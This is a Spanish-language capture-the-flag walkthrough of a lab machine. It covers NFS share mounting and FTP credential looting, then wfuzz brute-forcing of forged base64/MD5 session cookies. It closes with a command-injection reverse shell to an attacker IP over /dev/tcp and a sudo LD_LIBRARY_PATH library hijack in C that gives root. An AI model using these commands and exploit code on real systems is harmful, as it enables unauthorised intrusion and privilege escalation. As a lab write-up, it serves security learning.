Realizamos un escaneo de nmap
![[Pasted image 20240630083659.png]]
![[Pasted image 20240630094343.png]]

Revisamos y encontramos 3 puertos abiertos de NFS, los revisamos
![[Pasted image 20240630091508.png]]
- **Directorio Exportado**: `/mnt/share`
- **Acceso**: El asterisco (`*`) indica que este directorio está accesible para ser montado por cualquier cliente NFS autorizado en la red.

Montamos el directorio en nuestro sistema
```
sudo mount -t nfs 10.10.200.145:/mnt/share hijack_mount
```
![[Pasted image 20240630091823.png]]

Si intentamos acceder a la carpeta nos mostrara que no tenemos acceso
![[Pasted image 20240630092052.png]]

Para ello primero crearemos un usuario
![[Pasted image 20240630092208.png]]

Revisamos que esta creado
![[Pasted image 20240630092230.png]]

Cambiamos el grupo del usuario
![[Pasted image 20240630092614.png]]

Accedemos al usuario
![[Pasted image 20240630092302.png]]

Accedemos a la carpeta y obtenemos las credenciales de un usuario de ftp
![[Pasted image 20240630092713.png]]

Probamos a acceder y ya estamos dentro
![[Pasted image 20240630093124.png]]

Revisamos la carpeta y encontramos los siguientes archivos
![[Pasted image 20240630093202.png]]

Los descargamos
![[Pasted image 20240630093447.png]]

Leemos los fichero y encontramos que en uno nos dan un mensaje en el que nos indica que nos proporcionan una lista de contraseñas con un limite de intentos para evitar los ataques de fuerza bruta, el mensaje ya nos muestra dos usuarios, admin y rick
![[Pasted image 20240630093648.png]]

Y aquí tenemos el fichero con las contraseñas
![[Pasted image 20240630093855.png]]

Accedemos a la web y esto es lo primero que nos encontramos
![[Pasted image 20240630094312.png]]


Capturamos la petición del acceso del administrador y encontramos que se valida con PHPSESSID que esta codeada en base64
![[Pasted image 20240630102140.png]]

Si revisamos la cookie podemos encontrar que la password tiene un hash
![[Pasted image 20240630102431.png]]

Si ahora revisamos el hash podemos ver que es posible que este hasheado en MD5
![[Pasted image 20240630102537.png]]

Como podemos ver la web hace lo siguiente, coge el usuario y la password del usuario en MD5, coge toda la sintaxis y la codifica en bas64 y este es el codigo de nuestra intercepción, ahora para nosotros poder encontrar la password del usuario admin con el listado de contraseñas primero tenemos que convertir todas las passwords a MD5, para ello cremos el siguiente scrip
```Python
import hashlib
import sys

def md5_hash_passwords(file_path):
    output_file = "passwd_hashmd5"

    try:
        with open(file_path, 'r') as file, open(output_file, 'w') as output:
            for line in file:
                password = line.strip()  # Elimina espacios en blanco y saltos de línea
                md5_hash = hashlib.md5(password.encode()).hexdigest()
                output.write(f"{md5_hash}\n")
        
        print(f"Hashes MD5 de las contraseñas almacenados en '{output_file}'.")

    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except IOError as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <file_path>")
        sys.exit(1)

    file_path = sys.argv[1]
    md5_hash_passwords(file_path)
```

![[Pasted image 20240630103955.png]]
Y al ejecutarlo me almacena todas las contraseñas
![[Pasted image 20240630103926.png]]

Ahora creamos un bucle para coger todas las passwords del archivo y convertirlas a base64 cogiendo el siguiente formato
```Bash
while IFS= read -r line; do                                                      
	echo -n "admin:$line" | base64
done < passwd_hashmd5 > b64.txt

```
![[Pasted image 20240630110109.png]]

El formato esta codificando la siguiente estructura
```
admin:pass_en_MD5
```

Si ahora comprobamos este valor veremos el formato
![[Pasted image 20240630110507.png]]

Ahora ya podemos realizar el ataque de fuerza bruta, para ello usaremos la herramienta de wfuzz para obtener las credenciales para acceder al panel de admin
```
wfuzz -c --hc 404 --hh 0 --hl 0 -u http://10.10.200.145/administration.php -w b64.txt -H "Cookie: PHPSESSID=FUZZ" -t 200
```
![[Pasted image 20240630111034.png]]

Ahora dentro de la pagina del panel de admin vamos a inspeccionar la pagina y dentro de storage vamos a la consulta y cambiamos el valor de PHPSESSID
![[Pasted image 20240630111240.png]]

Esto equivaldria a capturar la peticion con burpsuite, modificar el valor de la cookie y enviar la peticion con forward
![[Pasted image 20240630111733.png]]

Refrescamos la pagina y ya estamos dentro
![[Pasted image 20240630111317.png]]

Ahora nos encontramos con un panel que parece revisar el estado de un servicio
![[Pasted image 20240630112159.png]]

Revisamos la version
![[Pasted image 20240630112228.png]]

Revisando los comandos que podemos utilizar encontramos que ejecuta los comandos en el sistema
![[Pasted image 20240630112434.png]]

Y ahora nos generamos una reverse shell ejecutando el siguiente comando
```
$(bash -c 'exec bash -i &>/dev/tcp/10.9.0.118/1234 <&1')
```
![[Pasted image 20240630112715.png]]

Leemos el fichero de config y obtenemos las credenciales de rick
![[Pasted image 20240630112839.png]]

Rrevisamos los permisos sudo y encontramos una posible vulnerabilidad en la variable de `env_keep+=LD_LIBRARY_PATH`
![[Pasted image 20240630120833.png]]

Encontramos la manera de explotarlo desde la siguiente web
```
https://book.hacktricks.xyz/linux-hardening/privilege-escalation?source=post_page-----65e9d2b1a717--------------------------------#ld_preload-and-ld_library_path
```

Ahora creamos el exploit en c
```C
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
![[Pasted image 20240630122055.png]]

Ejecutamos el siguiente comando
![[Pasted image 20240630122140.png]]
- `gcc`: Este es el comando del compilador GNU C.
- `-o /tmp/libcrypt.so.1`: Especifica el nombre del archivo de salida de la compilación. En este caso, el programa compilado se llamará `libcrypt.so.1` y se ubicará en el directorio `/tmp`.
- `-shared`: Esta opción indica que el resultado de la compilación debe ser una biblioteca compartida (también conocida como archivo de biblioteca dinámica). Las bibliotecas compartidas son archivos que contienen funciones y código que pueden ser utilizados por otros programas durante su ejecución.
- `-fPIC`: Esta opción indica que el código compilado debe ser compilado como código independiente de la posición (Position Independent Code, PIC). Esto es necesario para las bibliotecas compartidas porque permite que el código se cargue y ejecute en diferentes ubicaciones de memoria dentro del espacio de direcciones virtual del proceso.

Y ahora al ejecutar el siguiente comando ya obtenemos acceso a root
```
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
![[Pasted image 20240630122304.png]]

Obtención de la bandera de root
![[Pasted image 20240630122434.png]]


